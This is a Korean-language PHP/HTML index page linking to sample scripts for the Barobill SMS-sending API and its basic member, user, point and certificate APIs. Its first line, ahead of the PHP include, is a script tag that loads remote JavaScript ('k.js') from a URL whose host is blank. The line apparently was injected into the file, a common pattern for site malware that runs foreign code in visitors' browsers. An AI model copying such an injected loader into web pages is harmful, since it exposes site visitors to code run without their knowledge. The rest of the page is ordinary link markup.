<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>문자전송 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>전송</legend>
		<ul>
			<li><a href="API_SMS/SendMessage.php">SendMessage</a> - 문자(SMS/LMS) 발송</li>
			<li><a href="API_SMS/SendSMSMessage.php">SendSMSMessage</a> - 단문(SMS) 발송</li>
			<li><a href="API_SMS/SendLMSMessage.php">SendLMSMessage</a> - 장문(LMS) 발송</li>
			<li><a href="API_SMS/SendMMSMessageFromFTP.php">SendMMSMessageFromFTP</a> - 포토(MMS) 발송 (FTP)</li>
			<li><a href="API_SMS/SendMessages.php">SendMessages</a> - 다량전송</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>예약 취소</legend>
		<ul>
			<li><a href="API_SMS/CancelReservedSMSMessage.php">CancelReservedSMSMessage</a> - 예약 전송취소</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>정보</legend>
		<ul>
			<li><a href="API_SMS/GetSMSSendState.php">GetSMSSendState</a> - 문자 전송 상태 (바로빌부여 전송키)</li>
			<li><a href="API_SMS/GetSMSSendMessage.php">GetSMSSendMessage</a> - 문자 메시지 확인 (바로빌부여 전송키)</li>
			<li><a href="API_SMS/GetSMSSendMessages.php">GetSMSSendMessages</a> - 문자 메시지 대량 확인 (바로빌부여 전송키)</li>
			<li><a href="API_SMS/GetSMSSendMessagesByRefKey.php">GetSMSSendMessagesByRefKey</a> - 문자 메시지 확인 (연동사부여 전송키)</li>
			<li><a href="API_SMS/GetMessagesByReceiptNum.php">GetMessagesByReceiptNum</a> - 다량전송 내역 확인 (바로빌 다량전송키)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>URL 관련</legend>
		<ul>
			<li><a href="API_SMS/GetSMSHistoryURL.php">GetSMSHistoryURL</a> - 문자 전송내역 URL</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
			<li><a href="API_BAROBILL/GetBalanceCostAmountOfInterOP.php">GetBalanceCostAmountOfInterOP</a> - 연동사포인트 확인</li>
			<li><a href="API_BAROBILL/GetChargeUnitCost.php">GetChargeUnitCost</a> - 요금 단가 확인</li>
			<li><a href="API_BAROBILL/CheckChargeable.php">CheckChargeable</a> - 과금 가능여부 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>공인인증서 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetCertificateRegistURL.php">GetCertificateRegistURL</a></a> - 공인인증서 등록 URL</li>
			<li><a href="API_BAROBILL/GetCertificateExpireDate.php">GetCertificateExpireDate</a></a> - 등록한 공인인증서 만료일 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend style="color:red;">문자 발신번호 등록</legend>
		<ul>
			<li><a href="API_BAROBILL/RegistSMSFromNumber.php">RegistSMSFromNumber</a></a> - 발신번호 추가</li>
			<li><a href="API_BAROBILL/CheckSMSFromNumber.php">CheckSMSFromNumber</a></a> - 발신번호 확인</li>
			<li><a href="API_BAROBILL/GetSMSFromNumberURL.php">GetSMSFromNumberURL</a></a> - 발신번호 관리 URL</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>